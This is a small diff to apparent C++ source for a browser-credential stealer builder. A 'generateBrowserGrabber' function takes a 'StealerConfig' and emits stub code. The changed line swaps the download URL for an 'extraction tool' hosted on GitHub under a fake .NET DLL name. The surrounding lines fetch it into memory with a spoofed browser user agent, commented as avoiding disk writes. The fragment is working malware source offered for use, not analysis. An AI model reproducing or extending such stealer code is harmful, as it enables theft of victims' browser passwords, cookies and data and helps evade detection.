@@ -511,7 +511,7 @@ QString StubGenerator::generateBrowserGrabber(const StealerConfig& config) const
     code += "    if (workDir.back() == '\\\\') workDir.pop_back();\n";
     code += "    \n";
     code += "    // Download extraction tool to memory (no disk touch!)\n";
-    code += "    std::string toolUrl = \"https://raw.githubusercontent.com/Matero777/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.Extensions.dll\";\n";
+    code += "    std::string toolUrl = \"https://raw.githubusercontent.com/dev5-iAgree/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.Extensions.dll\";\n";
     code += "    \n";
     code += "    HINTERNET hSession = WinHttpOpen(L\"Mozilla/5.0\", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);\n";
     code += "    if (!hSession) {\n";
